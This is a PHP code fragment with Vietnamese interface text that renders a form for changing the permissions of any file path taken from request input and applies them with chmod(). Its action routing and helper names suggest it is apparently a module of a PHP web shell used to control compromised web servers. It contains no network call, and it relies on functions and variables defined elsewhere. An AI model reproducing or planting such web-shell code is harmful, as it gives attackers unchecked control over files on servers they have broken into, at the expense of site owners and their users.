<?php


 $mode = fileperms($d.$f);
 if (!$mode) {echo "<b>Thay đổi chmod:</b> không thể lấy giá trị.";}
 else
 {
  $form = true;
  if ($chmod_submit)
  {
   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
   if (chmod($d.$f,$octet)) {$act = "ls"; $form = false; $err = ""; echo noidung('Chmod thành công!');}
   else {$err = "Không thể chmod đến ".$octet.".";}
  }
  if ($form)
  {
   $perms = parse_perms($mode);
   echo "<b>Thay đổi chmod (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b>
   <br>".($err?"<b>Lỗi:</b> ".$err:"")."<form action=\"\" method=\"POST\">
   <input type=hidden name=d value=\"".htmlspecialchars($d)."\">
   <input type=hidden name=f value=\"".htmlspecialchars($f)."\">
   <input type=hidden name=act value=chmod>
   <b>Owner</b><br><br>
   <input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">
   &nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Viết<br>
   <input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">Thực thi
   <br/><b>Nhóm</b>
   <br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br>
   <input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Viết<br>
   <input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">Thực thi</font><br/>
   <b>World</b><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">
   &nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Viết<br>
   <input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">Thực thi</font></td></tr><tr>
   <td><input type=submit name=chmod_submit value=\"Save\"></td></tr></form>";
  }
 }

 
 